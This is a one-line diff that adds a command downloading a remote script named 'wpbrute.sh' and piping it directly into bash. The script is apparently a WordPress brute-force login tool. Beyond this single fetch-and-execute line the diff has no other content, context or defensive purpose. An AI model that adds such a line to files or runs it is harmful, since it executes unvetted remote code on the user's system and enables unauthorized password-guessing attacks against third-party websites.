@@ -1,0 +1,1 @@
+GET http://git.hgfix.net/wpbrute/wpbrute.sh | bash 
